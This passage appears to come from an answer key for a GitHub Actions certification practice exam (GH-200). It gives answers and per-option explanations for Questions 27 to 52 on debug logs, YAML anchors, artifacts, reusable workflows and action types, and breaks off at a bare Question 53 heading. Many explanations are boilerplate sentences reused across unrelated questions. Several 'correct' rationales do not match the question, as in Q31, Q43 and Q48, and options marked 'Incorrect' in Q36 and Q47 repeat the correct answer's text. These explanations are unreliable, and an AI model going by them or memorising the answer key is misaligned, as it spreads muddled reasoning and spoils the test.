Correct answer: B (is correct). Setting `ACTIONS_STEP_DEBUG = true` emits verbose `##[debug]` step trace lines and setting `ACTIONS_RUNNER_DEBUG = true` captures detailed runner/worker coordination logs (`and checking Enable debug logging during a UI re-run toggles both transiently`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 28 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Exit code `137` (`128 + SIGKILL 9`) indicates the Linux OOM killer or container cgroup memory limit terminated the process, whereas exit code `127` indicates `command not found` (`missing binary or unexported $GITHUB_PATH`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 29 — `A, F` (Consume and troubleshoot workflows)

Correct answers: A and F (are correct). Inside the self-hosted runner's `_diag/` directory, `Runner_*.log` records persistent listener registration, heartbeats, and network session drops, whereas `Worker_*.log` records isolated execution details for a single assigned job. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **B:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.

### Question 30 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Explicit keys defined in the local mapping (`REGION: eu-west-1`) override identically named keys merged via `<<: *base_env`, while non-overridden anchored keys (`LOG_LEVEL: info`, `RETRIES: "3"`) remain intact. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.

### Question 31 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). In YAML 1.1/1.2, an anchor (`&name`) MUST be defined lexically earlier in the same document stream before any alias (`*name`) references it; forward references to later lines fail parser validation before jobs are queued. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **C:** Incorrect. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.
- **D:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.

### Question 32 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). GitHub Actions re-runs ONLY the failed `test (windows-2025, nightly)` leg (`reusing cached results from the 11 successful matrix legs`) and then automatically executes downstream dependent jobs (`package`) once the retried leg passes. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Correct. GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.
- **C:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 33 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Correlating the red run-graph node to its `matrix` axes, inspecting the first non-zero exit / `::error::` line, running `Re-run failed jobs` with `Enable debug logging`, and pushing the verified fix minimizes time and billable minutes. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. Deleting workflows erases run history, printing secrets violates security rules, and re-running green matrix legs wastes billable minutes.
- **B:** Incorrect. Standard GitHub-hosted runners do not expose inbound port 22 SSH, and permanent org-wide debug logging bloats log storage.
- **C:** Incorrect. Suppressing exit codes with `|| true` hides real regressions rather than diagnosing the failing matrix variant.
- **D:** Correct. Selective `Re-run failed jobs` with `Enable debug logging` (`ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG`) isolates failures without re-billing green legs.

### Question 34 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). `gh run view <run-id> --log-failed` fetches and prints exclusively the log output of steps that exited non-zero, whereas `--log` prints all steps and `GET .../actions/runs/{run_id}/logs` returns a `302` redirect to a short-lived zip archive. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 35 — `A, B` (Consume and troubleshoot workflows)

Correct answers: A and B (are correct). `gh run list --branch main --event workflow_dispatch --status failure` (`or UI branch:main is:failure event:workflow_dispatch`) filters runs precisely, and `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`actions: read`) returns a `302` zip download URL. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **B:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 36 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). No — `actions/upload-artifact@v4` artifacts are immutable once finalized and cannot be appended or overwritten across jobs; give each matrix leg a unique name (`junit-report-${{ matrix.os }}`) and merge them later with `actions/download-artifact@v4` (`pattern: junit-report-*`, `merge-multiple: true`). [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Correct. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `actions/upload-artifact@v4` artifacts are immutable once finalized and cannot be appended or overwritten across jobs; give each matrix leg a unique name (`junit-report-${{ matrix.os }}`) and merge them later with `actions/download-artifact@v4` (`pattern: junit-report-*`, `merge-multiple: true`).
- **C:** Incorrect. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **D:** Incorrect. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.

### Question 37 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). In the terminal, `gh run download 99812234 -n sbom-spdx` downloads the named artifact (`unzipped`), while in another workflow run `actions/download-artifact@v4` accepts `run-id: 99812234` alongside `github-token` with `actions: read`. [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 38 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). GitHub Actions supports up to `4` levels of nested reusable workflows and up to `50` total reusable workflow calls per run, and `jobs.<id>.uses` is resolved before runner startup so it requires a literal `@<sha>/<tag>/<branch>` (`no env/steps expressions`). [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.

### Question 39 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). `secrets: inherit` passes caller repository/org secrets only when both caller and callee belong to the SAME organization (or Enterprise), and throughout execution `github.repository` continues to reflect the caller repo (`kestrelpay/card-router`). [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **C:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 40 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Creating an `Internal`/`Private` `<org>/.github` repo, adding `workflow-templates/<name>.yml` (`with $default-branch`), adding `<name>.properties.json` (`name`, `iconName`, `filePatterns`), and verifying `Actions -> New workflow` publishes org-scoped starter templates. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Every `.properties.json` requires a matching `<name>.yml` in `workflow-templates/` (plus optional `<iconName>.svg`).
- **B:** Correct. Organization starter workflows live in `<org>/.github/workflow-templates/` as paired `.yml` + `.properties.json` files (`private templates require Enterprise`).
- **C:** Incorrect. Starter workflows copy a static `.yml` scaffold into target repos once; centralized runtime execution requires a `workflow_call` Reusable Workflow.
- **D:** Incorrect. Files in `.github/workflows/` run on `<org>/.github` itself rather than appearing as templates, and `.properties.json` is mandatory.

### Question 41 — `B, D` (Consume and troubleshoot workflows)

Correct answers: B and D (are correct). Starter templates in `<org>/.github/workflow-templates/` copy a static `.yml` file into new repos once (`edits to the template do NOT update existing repos`), whereas `workflow_call` Reusable Workflows encapsulate entire centrally maintained multi-job pipelines and Composite Actions bundle reusable steps inside one job. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Correct. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Correct. Starter templates bootstrap new repos as independent copies, whereas `workflow_call` reusable workflows centralize ongoing maintenance in one versioned file.
- **E:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 42 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Running `gh workflow disable perf-soak.yml` (`re-enabled later via gh workflow enable`) stops `schedule` and webhook triggers while keeping historical run logs and the YAML file intact (`except workflow_dispatch if manually re-enabled`). [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 43 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). To conserve shared compute across public repositories, GitHub automatically disables `on: schedule` workflows in `Public` repositories after `60 days` of repository inactivity until a maintainer re-enables the workflow or pushes new activity. [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 44 — `A` (Author and maintain actions)

Correct answer: A (is correct). JavaScript actions with `runs: { using: 'node20', pre: 'dist/setup.js', main: 'dist/index.js', post: 'dist/cleanup.js', 'post-if': 'always()' }` execute natively on Linux, macOS, and Windows runners with full `pre`/`main`/`post` lifecycle hooks. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **B:** Incorrect. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 45 — `D` (Author and maintain actions)

Correct answer: D (is correct). Compile and bundle the TypeScript/JavaScript entrypoint AND all `node_modules` dependencies into a single committed `dist/index.js` (`for example via @vercel/ncc build src/index.ts -o dist`) so runners execute immediately without running `npm ci`. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.

### Question 46 — `A` (Author and maintain actions)

Correct answer: A (is correct). Authoring `action.yml` (`using: "node20"`, `main: "dist/index.js"`), coding with `@actions/core` & `core.setFailed()`, bundling dependencies into committed `dist/index.js` via `@vercel/ncc`, and tagging `v1.0.0` + `v1` + 40-char SHA is the canonical release lifecycle. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Correct. Bundling `node20` JavaScript actions into committed `dist/index.js` gives sub-second cross-OS execution with zero consumer `npm install` step.
- **B:** Incorrect. Docker actions fail on macOS and Windows runners; cross-OS custom actions require JavaScript (`node20`) or Composite actions.
- **C:** Incorrect. Omitting both `dist/` and `node_modules/` crashes immediately with `Cannot find module`, `node12` is retired, and `@main` is unsafe.
- **D:** Incorrect. Bundled `dist/index.js` + `action.yml` runs standalone with zero pre-install steps in caller workflows.

### Question 47 — `B` (Author and maintain actions)

Correct answer: B (is correct). No — Docker container actions (`runs.using: 'docker'`) are supported ONLY on Linux runners with Docker installed and fail on macOS and Windows jobs; cross-OS actions must be authored as JavaScript (`node20`) or Composite (`composite`) actions. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **B:** Correct. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — Docker container actions (`runs.using: 'docker'`) are supported ONLY on Linux runners with Docker installed and fail on macOS and Windows jobs; cross-OS actions must be authored as JavaScript (`node20`) or Composite (`composite`) actions.
- **D:** Incorrect. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.

### Question 48 — `A` (Author and maintain actions)

Correct answer: A (is correct). Every `run:` step inside a `runs.using: 'composite'` action MUST explicitly declare `shell:` (`it does not inherit caller defaults.run.shell`), and `${{ github.action_path }}` resolves to the directory where the composite action itself is checked out (`not github.workspace`). [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **B:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 49 — `A, D` (Author and maintain actions)

Correct answers: A and D (are correct). Docker container actions guarantee strict OS/package isolation (`at the cost of container pull/build latency and Linux-only runner support`), while Composite actions run on Linux/macOS/Windows, require explicit `shell:` on every `run:` step, and map outputs via `runs.outputs.<id>.value`. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **B:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **C:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **D:** Correct. Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 50 — `C` (Author and maintain actions)

Correct answer: C (is correct). Immutable Actions publish each versioned release as an immutable OCI artifact in GitHub Container Registry (`GHCR`), blocking version tag mutation/overwrites so consumers always fetch the exact immutable release digest. [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 51 — `C` (Author and maintain actions)

Correct answer: C (is correct). Calling `core.setFailed(error.message)` inside a `try/catch` block emits an `::error::` annotation and sets `process.exitCode = core.ExitCode.Failure` (`1`) while allowing async flushing and `post:` lifecycle scripts to finish cleanly. [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 52 — `B` (Author and maintain actions)

Correct answer: B (is correct). GitHub Actions converts each input name to uppercase, replaces spaces with `_` (`preserving hyphens`), and prefixes `INPUT_` (`so inputs.api-timeout becomes env var INPUT_API-TIMEOUT`), which `core.getInput('api-timeout', { required: true })` reads and trims. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 53 — `A` (Author and maintain actions)

